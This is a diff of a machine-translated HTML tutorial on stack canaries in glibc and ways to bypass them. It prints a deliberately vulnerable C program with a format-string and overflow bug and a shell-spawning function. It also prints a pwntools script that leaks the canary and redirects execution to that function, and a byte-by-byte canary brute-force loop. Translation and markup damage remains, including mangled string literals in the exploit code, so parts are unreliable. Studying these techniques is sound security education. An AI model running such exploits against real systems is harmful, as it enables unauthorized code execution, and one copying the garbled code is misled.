@@ -4684,8 +4684,8 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#one-by-one-canary" class="md-nav__link">
-    one-by-one 爆破 Canary
+  <a href="#one-by-one-crack-canary" class="md-nav__link">
+    one-by-one crack Canary
   </a>
   
 </li>
@@ -4739,14 +4739,13 @@
 <h2 id="introduction">Introduction<a class="headerlink" href="#introduction" title="Permanent link">&para;</a></h2>
 <p>Attacks caused by stack overflows are very common and very old. A mitigation technique called canary has long appeared in glibc and has been the first line of defense for system security.</p>
 <p>Canary is simple and efficient in both implementation and design. It is to insert a value. At the end of the high-risk area where stack overflow occurs, when the function returns, check if the value of canary has been changed to determine whether stack/buffer overflow is occur.</p>
-<p>Canary and GS protection under Windows are effective means to prevent stack overflow. Its appearance largely prevents stack overflow, and since it hardly consumes system resources, it has become the standard of protection mechanism under Linux. Match</p>
+<p>Canary and GS protection under Windows are effective means to prevent stack overflow. Its appearance largely prevents stack overflow, and since it hardly consumes system resources, it has become the standard of protection mechanism under Linux.</p>
 <h2 id="canary-principle">Canary Principle<a class="headerlink" href="#canary-principle" title="Permanent link">&para;</a></h2>
 <h3 id="using-canary-in-gcc">Using Canary in GCC<a class="headerlink" href="#using-canary-in-gcc" title="Permanent link">&para;</a></h3>
 <p>Canary can be set in GCC with the following parameters:</p>
-<div class="codehilite"><pre><span></span>-fstack-protector enables protection, but only inserts protection for functions that have arrays in local variables
--fstack-protector-all Enable protection, insert protection for all functions
+<div class="codehilite"><pre><span></span>-fstack-protector enables protection, but only inserts protection <span class="k">for</span> functions that have arrays in <span class="nb">local</span> variables
+-fstack-protector-all Enable protection, insert protection <span class="k">for</span> all functions
 -fstack-protector-strong
-
 -fstack-protector-explicit Only protects functions with explicit stack_protect attribute
 -fno-stack-protector Disable protection.
 </pre></div>
@@ -4782,105 +4781,64 @@
 </pre></div>
 
 <p>When the program enables Canary compilation, the value at fs register 0x28 is taken in the prologue of the function and stored in the stack at %ebp-0x8.
-This operation is to insert the Canary value into the stack, the code is as follows:
-<code>`</code>asm
-mov    rax, qword ptr fs:[0x28]</p>
-<p>mov qword ptr [rbp-8], rax
-<div class="codehilite"><pre><span></span>This value is taken out before the function returns and XORed with the value of fs:0x28. If the result of the exclusive OR is 0, the canary is not modified, and the function returns normally. This operation is to detect whether a stack overflow occurs.
+This operation is to insert the Canary value into the stack, the code is as follows:</p>
+<div class="codehilite"><pre><span></span><span class="nf">mov</span>    <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="no">fs</span><span class="p">:[</span><span class="mi">0x28</span><span class="p">]</span>
+<span class="nf">mov</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">],</span> <span class="no">rax</span>
+</pre></div>
 
+<p>This value is taken out before the function returns and XORed with the value of fs:0x28. If the result of the exclusive OR is 0, the canary is not modified, and the function returns normally. This operation is to detect whether a stack overflow occurs.</p>
+<div class="codehilite"><pre><span></span><span class="nf">mov</span> <span class="no">rdx</span><span class="p">,</span> <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x8</span><span class="p">]</span>
+<span class="nf">xor</span> <span class="no">rdx</span><span class="p">,</span> <span class="no">QWORD</span> <span class="no">PTR</span> <span class="no">fs</span><span class="p">:</span> <span class="mi">0x28</span>
+<span class="nf">je</span> <span class="mh">0x4005d7</span> <span class="p">&lt;</span><span class="no">main</span><span class="p">+</span><span class="mi">65</span><span class="p">&gt;</span>
+<span class="nf">call</span>   <span class="mh">0x400460</span> <span class="p">&lt;</span><span class="no">__stack_chk_fail@plt</span><span class="p">&gt;</span>
+</pre></div>
 
-`` `asm
-mov rdx, QWORD PTR [rbp-0x8]
-chor rdx, QWORD PTR fs: 0x28
-your 0x4005d7 &lt;main+65&gt;
-call   0x400460 &lt;__stack_chk_fail@plt&gt;
-</pre></div></p>
 <p>If the canary has been illegally modified, the program flow will go to <code>__stack_chk_fail</code>. <code>__stack_chk_fail</code> is also a function in glibc, which by default is delayed by ELF and is defined as follows.</p>
 <div class="codehilite"><pre><span></span><span class="n">eglibc</span><span class="o">-</span><span class="mf">2.19</span><span class="o">/</span><span class="n">debug</span><span class="o">/</span><span class="n">stack_chk_fail</span><span class="p">.</span><span class="n">c</span>
-
-
-
 <span class="kt">void</span> <span class="n">__attribute__</span> <span class="p">((</span><span class="n">noreturn</span><span class="p">))</span> <span class="n">__stack_chk_fail</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span>
-
 <span class="p">{</span>
-
   <span class="n">__fortify_fail</span> <span class="p">(</span><span class="s">&quot;stack smashing detected&quot;</span><span class="p">);</span>
-
 <span class="p">}</span>
-
-
-
 <span class="kt">void</span> <span class="n">__attribute__</span> <span class="p">((</span><span class="n">noreturn</span><span class="p">))</span> <span class="n">internal_function</span> <span class="n">__fortify_fail</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">msg</span><span class="p">)</span>
-
 <span class="p">{</span>
-
   <span class="cm">/* The loop is added only to keep gcc happy.  */</span>
-
   <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-
     <span class="n">__libc_message</span> <span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">&quot;*** %s ***: %s terminated</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span>
-
                     <span class="n">msg</span><span class="p">,</span> <span class="n">__libc_argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">?:</span> <span class="s">&quot;&lt;unknown&gt;&quot;</span><span class="p">);</span>
-
 <span class="p">}</span>
 </pre></div>
 
 <p>This means that you can hijack the process by hijacking the <code>__stack_chk_fail</code>&#39;s got value or leaking content with <code>__stack_chk_fail</code> (see stack smash).</p>
 <p>Further, for Linux, the fs register actually points to the TLS structure of the current stack, and fs:0x28 points to stack_guard.
 <div class="codehilite"><pre><span></span><span class="k">typedef</span> <span class="k">struct</span>
-
 <span class="p">{</span>
-
   <span class="kt">void</span> <span class="o">*</span><span class="n">tcb</span><span class="p">;</span>        <span class="cm">/* Pointer to the TCB.  Not necessarily the</span>
-
-<span class="cm">                       thread descriptor used by libpthread.  */</span>
-
-<span class="n">dtv_t</span> <span class="o">*</span> <span class="n">dtv</span><span class="p">;</span>
+<span class="cm">                                   thread descriptor used by libpthread.  */</span>
+  <span class="n">dtv_t</span> <span class="o">*</span> <span class="n">dtv</span><span class="p">;</span>
   <span class="kt">void</span> <span class="o">*</span><span class="n">self</span><span class="p">;</span>       <span class="cm">/* Pointer to the thread descriptor.  */</span>
-
   <span class="kt">int</span> <span class="n">multiple_threads</span><span class="p">;</span>
-
   <span class="kt">uintptr_t</span> <span class="n">sysinfo</span><span class="p">;</span>
-
   <span class="kt">uintptr_t</span> <span class="n">stack_guard</span><span class="p">;</span>
-
   <span class="p">...</span>
-
 <span class="p">}</span> <span class="n">tcbhead_t</span><span class="p">;</span>
 </pre></div></p>
 <p>A bypass protection mechanism can be implemented if there is an overflow that overrides the Canary value stored in TLS.</p>
 <p>In fact, the value in TLS is initialized by the function security_init.</p>
 <div class="codehilite"><pre><span></span><span class="k">static</span> <span class="kt">void</span>
-
 <span class="nf">security_init</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span>
-
 <span class="p">{</span>
-
 <span class="c1">// The value of _dl_random is already written by the kernel when entering this function.</span>
 <span class="c1">// glibc directly uses the value of _dl_random and does not assign it</span>
 <span class="c1">// If you don&amp;#39;t use this mode, glibc can also generate random numbers by itself.</span>
-
-
 <span class="o">/</span> <span class="o">/</span> <span class="n">Set</span> <span class="n">the</span> <span class="n">last</span> <span class="n">byte</span> <span class="n">of</span> <span class="n">_dl_random</span> <span class="n">to</span> <span class="mh">0x0</span>
-  <span class="kt">uintptr_t</span> <span class="n">stack_chk_guard</span> <span class="o">=</span> <span class="n">_dl_setup_stack_chk_guard</span> <span class="p">(</span><span class="n">_dl_random</span><span class="p">);</span>
-
-
-
+<span class="kt">uintptr_t</span> <span class="n">stack_chk_guard</span> <span class="o">=</span> <span class="n">_dl_setup_stack_chk_guard</span> <span class="p">(</span><span class="n">_dl_random</span><span class="p">);</span>
 <span class="o">/</span> <span class="o">/</span> <span class="n">Set</span> <span class="n">the</span> <span class="n">value</span> <span class="n">of</span> <span class="n">Canary</span> <span class="n">to</span> <span class="n">TLS</span>
-  <span class="n">THREAD_SET_STACK_GUARD</span> <span class="p">(</span><span class="n">stack_chk_guard</span><span class="p">);</span>
-
-
-
-  <span class="n">_dl_random</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
-
+<span class="n">THREAD_SET_STACK_GUARD</span> <span class="p">(</span><span class="n">stack_chk_guard</span><span class="p">);</span>
+<span class="n">_dl_random</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
 <span class="p">}</span>
-
-
-
 <span class="c1">//THREAD_SET_STACK_GUARD macro is used to set TLS</span>
 <span class="cp">#define THREAD_SET_STACK_GUARD(value) \</span>
-
-  <span class="n">THREAD_SETMEM</span> <span class="p">(</span><span class="n">THREAD_SELF</span><span class="p">,</span> <span class="n">header</span><span class="p">.</span><span class="n">stack_guard</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span>
+<span class="cp">THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span>
 </pre></div>
 
 <h2 id="canary-bypass-technology">Canary bypass technology<a class="headerlink" href="#canary-bypass-technology" title="Permanent link">&para;</a></h2>
@@ -4893,54 +4851,30 @@ This type of utilization requires the existence of a suitable output function, a
 <h4 id="using-examples">Using examples<a class="headerlink" href="#using-examples" title="Permanent link">&para;</a></h4>
 <p>The sample source code for the vulnerability is as follows:</p>
 <div class="codehilite"><pre><span></span><span class="c1">// ex2.c</span>
-
 <span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
-
 <span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
-
 <span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
-
 <span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
-
 <span class="kt">void</span> <span class="nf">getshell</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
-
     <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">);</span>
-
 <span class="p">}</span>
-
 <span class="kt">void</span> <span class="nf">init</span><span class="p">()</span> <span class="p">{</span>
-
     <span class="n">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
-
     <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
-
     <span class="n">setbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
-
 <span class="p">}</span>
-
 <span class="kt">void</span> <span class="nf">vuln</span><span class="p">()</span> <span class="p">{</span>
-
     <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
-
     <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="mi">2</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
-
         <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">);</span>
-
         <span class="n">printf</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
-
     <span class="p">}</span>
-
 <span class="p">}</span>
-
 <span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
-
     <span class="n">init</span><span class="p">();</span>
-
     <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Hello Hacker!&quot;</span><span class="p">);</span>
-
-<span class="n">vuln</span> <span class="p">();</span>
+    <span class="n">vuln</span> <span class="p">();</span>
     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-
 <span class="p">}</span>
 </pre></div>
 
@@ -4948,99 +4882,44 @@ This type of utilization requires the existence of a suitable output function, a
 <p>First print out the 4-digit Canary by overwriting the last <code>\x00</code> byte of Canary
 After that, calculate the offset, fill Canary into the corresponding overflow position, and implement Ret into the getshell function.</p>
 <div class="codehilite"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
-
-
-
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-
-
-
 <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="s1">&#39;ex2&#39;</span>
-
 <span class="c1">#context.log_level = &#39;debug&#39;</span>
-
 <span class="n">io</span> <span class="o">=</span> <span class="n">process</span> <span class="p">(</span><span class="o">&amp;</span><span class="c1">#39;./ ex2&amp;#39;)</span>
-
-
 <span class="n">get_shell</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./ex2&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&quot;getshell&quot;</span><span class="p">]</span>
-
-
-
 <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span><span class="n">Hello</span> <span class="n">Hacker</span><span class="err">!</span>
-
-
 <span class="c1"># leak Canary</span>
-
 <span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">100</span>
-
 <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-
-
-
 <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span> <span class="p">(</span> <span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span> <span class="o">*</span> <span class="mi">100</span><span class="p">)</span>
 <span class="n">Canary</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span><span class="o">-</span><span class="mh">0xa</span>
-
 <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;Canary:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">Canary</span><span class="p">))</span>
-
-
-
 <span class="c1"># Bypass Canary</span>
-
 <span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x90</span><span class="s2">&quot;</span><span class="o">*</span><span class="mi">100</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">Canary</span><span class="p">)</span><span class="o">+</span><span class="s2">&quot;</span><span class="se">\x90</span><span class="s2">&quot;</span><span class="o">*</span><span class="mi">12</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">get_shell</span><span class="p">)</span>
-
 <span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-
-
-
 <span class="n">io</span><span class="o">.</span><span class="n">recv</span> <span class="p">()</span>
-
-
 <span class="n">io</span><span class="o">.</span><span class="n">interactive</span> <span class="p">()</span>
 </pre></div>
 
-<h3 id="one-by-one-canary">one-by-one 爆破 Canary<a class="headerlink" href="#one-by-one-canary" title="Permanent link">&para;</a></h3>
+<h3 id="one-by-one-crack-canary">one-by-one crack Canary<a class="headerlink" href="#one-by-one-crack-canary" title="Permanent link">&para;</a></h3>
 <p>For Canary, although the Canary is different each time the same process restarts (the same as GS, GS is restarted), but the Canary of each thread in the same process is identical.
 Also, there is a class that opens the child process interaction through the fork function, because the fork function directly copies the memory of the parent process, so the Canary of each child process created is the same. We can use this feature to completely blast Canary byte by byte.
 In the famous offset2libc bypassing all protected linux64bit articles, the author is using this way to blast the Canary:
 This is the Python code for blasting:</p>
 <div class="codehilite"><pre><span></span><span class="nb">print</span> <span class="s2">&quot;[+] Brute forcing stack canary &quot;</span>
-
-
-
 <span class="n">start</span> <span class="o">=</span> <span class="nb">len</span> <span class="p">(</span><span class="n">p</span><span class="p">)</span>
 <span class="n">stop</span> <span class="o">=</span> <span class="nb">len</span> <span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="o">+</span><span class="mi">8</span>
-
-
 <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">stop</span><span class="p">:</span>
-
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">xrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">256</span><span class="p">):</span>
-
       <span class="n">res</span> <span class="o">=</span> <span class="n">send2server</span><span class="p">(</span><span class="n">p</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
-
-
-
       <span class="k">if</span> <span class="n">res</span> <span class="o">!=</span> <span class="s2">&quot;&quot;</span><span class="p">:</span>
-
          <span class="n">p</span> <span class="o">=</span> <span class="n">p</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
-
          <span class="c1">#print &quot;\t[+] Byte found 0x%02x&quot; % i</span>
-
          <span class="k">break</span>
-
-
-
       <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">255</span><span class="p">:</span>
-
          <span class="nb">print</span> <span class="s2">&quot;[-] Exploit failed&quot;</span>
-
          <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
-
-
-
-
-
 <span class="n">canary</span> <span class="o">=</span> <span class="n">p</span><span class="p">[</span><span class="n">stop</span><span class="p">:</span><span class="n">start</span><span class="o">-</span><span class="mi">1</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&quot;hex&quot;</span><span class="p">)</span>
-
 <span class="nb">print</span> <span class="s2">&quot;   [+] SSP value is 0x</span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">canary</span>
 </pre></div>
 
